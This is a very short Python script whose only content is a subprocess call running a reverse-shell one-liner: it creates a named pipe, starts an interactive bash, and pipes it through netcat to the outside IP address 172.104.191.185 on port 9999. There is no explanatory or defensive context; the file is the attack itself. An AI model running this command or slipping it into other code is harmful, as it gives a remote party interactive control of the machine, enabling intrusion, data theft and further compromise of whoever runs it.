import subprocess


subprocess.run("mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 172.104.191.185 9999 >/tmp/f")
